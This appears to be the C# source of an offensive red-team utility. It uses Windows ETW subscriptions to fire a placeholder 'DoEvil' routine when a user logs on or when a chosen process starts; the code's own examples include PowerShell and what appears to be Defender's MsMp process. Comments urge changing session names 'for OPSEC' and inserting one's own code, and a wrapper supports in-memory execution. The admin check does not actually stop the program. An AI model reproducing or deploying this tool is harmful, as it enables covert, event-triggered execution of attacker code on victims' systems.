using Microsoft.Diagnostics.Tracing;
using Microsoft.Diagnostics.Tracing.Parsers;
using Microsoft.Diagnostics.Tracing.Parsers.Kernel;
using Microsoft.Diagnostics.Tracing.Session;
using System;
using System.Security.Principal;
using System.IO;
using System.Runtime.InteropServices;

namespace ETWEventSubscription
{
    class Program
    {
        //Make sure you change this to execute your code!
        static void DoEvil()
        {
            Console.WriteLine("My evil code would execute here");
        }

[DllImport("shell32.dll", SetLastError = true)]
static extern IntPtr CommandLineToArgvW([MarshalAs(UnmanagedType.LPWStr)] string lpCmdLine, out int pNumArgs);

[DllImport("advapi32.dll", SetLastError = true)]
static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

public static string[] CommandLineToArgs(string commandLine)
{
    int argc;
    var argv = CommandLineToArgvW(commandLine, out argc);
    if (argv == IntPtr.Zero)
        throw new System.ComponentModel.Win32Exception();
    try
    {
        var args = new string[argc];
        for (var i = 0; i < args.Length; i++)
        {
            var p = Marshal.ReadIntPtr(argv, i * IntPtr.Size);
            args[i] = Marshal.PtrToStringUni(p);
        }

        return args;
    }
    finally
    {
        Marshal.FreeHGlobal(argv);
    }
}

public static string Execute(string commandLine)
{
    var sw = new StringWriter();
    Console.SetOut(sw);
    Console.SetError(sw);

    try
    {
        Main(CommandLineToArgs(commandLine));
    }
    catch (Exception e)
    {
        return e.ToString();
    }

    return sw.ToString();
}

        static void Main(string[] args)
        {
            string self = typeof(Program).Namespace;
            string usage = "Usage:\n";
            usage += $"    {self}.exe -UserLogon\n";
            usage += $"    {self}.exe -ProcStart <keyword>";

            if (args.Length < 1)
            {
                Console.WriteLine(usage);
                return;
            }
            if (args[0].Equals("-UserLogon"))
            {
                IsAdmin();
                UserLogon();
            }
            else if (args[0].Equals("-ProcStart"))
            {
                if (args.Length < 2)
                {
                    Console.WriteLine("[-] Missing target process keyword (powersh, MsMp, etc.)");
                    return;
                }
                IsAdmin();
                ProcStart(args[1]);
            }
            else
            {
                Console.WriteLine(usage);
                return;
            }
        }

        static void UserLogon()
        {
            Console.WriteLine("Waiting for a user to log on...");
            var sessionName = "UserSession"; //Change this for OPSEC
            using (var session = new TraceEventSession(sessionName, null))
            {
                session.StopOnDispose = true;
                using (var source = new ETWTraceEventSource(sessionName, TraceEventSourceType.Session)) //Use a realtime session
                {
                    var parser = new RegisteredTraceEventParser(source);
                    parser.All += delegate (TraceEvent data)
                    {
                        string message = data.FormattedMessage;
                        if (!string.IsNullOrEmpty(message) && message.Contains("Authentication stopped. Result 0"))
                        {
                            Console.WriteLine("User login detected");
                            DoEvil();
                        }
                    };

                    Guid provider = new Guid("DBE9B383-7CF3-4331-91CC-A3CB16A3B538");
                    session.EnableProvider(provider, TraceEventLevel.Verbose);
                    source.Process();

                    Console.CancelKeyPress += (object s, ConsoleCancelEventArgs args) => session.Stop();
                    session.Dispose();

                };
            }
        }

        static void ProcStart(string procKeyword)
        {
            Console.WriteLine("Waiting for a process containing \"{0}\" to start...", procKeyword);
            using (var session = new TraceEventSession("KernelSession")) //Change this for OPSEC
            {
                session.EnableKernelProvider(KernelTraceEventParser.Keywords.Process);

                session.Source.Kernel.ProcessStart += delegate (ProcessTraceData data) {
                    if (data.ProcessName.Contains(procKeyword))
                    {
                        Console.WriteLine($"Detected execution of {data.ProcessName} matching keyword \"{procKeyword}\"");
                        DoEvil();
                    }
                };

                session.Source.Process();

                Console.CancelKeyPress += (object s, ConsoleCancelEventArgs args) => session.Stop();
                session.Dispose();
            }
        }

        static void IsAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Console.WriteLine("[-] You do not have admin privileges required to use the provider. Exiting.");
                return;
            }
        }
    }
}

